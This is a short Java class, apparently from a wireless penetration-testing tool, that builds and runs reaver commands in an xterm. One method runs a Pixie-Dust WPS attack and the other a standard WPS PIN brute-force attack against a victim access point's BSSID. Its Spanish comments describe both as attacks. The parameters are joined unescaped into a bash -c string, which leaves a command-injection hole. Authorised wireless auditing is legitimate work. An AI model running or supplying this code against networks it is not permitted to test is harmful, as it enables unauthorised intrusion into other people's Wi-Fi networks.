package avatar.wireless.testing.ataque;

import avatar.wireless.testing.Shell;
import java.io.IOException;

public class WPS {

    public WPS() {
    }

    Shell ejecutor = new Shell();

    public void ReaverPixieWps(String monitor, String Channel, String BSSIDvictima, String n) throws IOException {
        //Aqui se ejecuta el ataque de reaver y pixiewps al mismo tiempo el valor de -K es modificable
        //dentro del rango -K n. n=(1 , 2 , 3)

        String command = "reaver -i " + monitor + " -c " + Channel + " -b " + BSSIDvictima + " -vv -K " + n;
        String cmd = "xterm -e 'bash -c \"" + command + "\"; read; '";
        ejecutor.ExecuteCommandString(cmd);

    }

    public void ReaverStandar(String monitor, String canal, String BSSIDvictima) throws IOException {
        //Aqui se ejecuta el ataque de reaver standar que prueba todas las combinaciones de codigos ping

        String command = "reaver -i " + monitor + " -c " + canal + " -b " + BSSIDvictima;
        String cmd = "xterm -e 'bash -c \"" + command + "\"; read; '";

        ejecutor.ExecuteCommandString(cmd);

    }

}
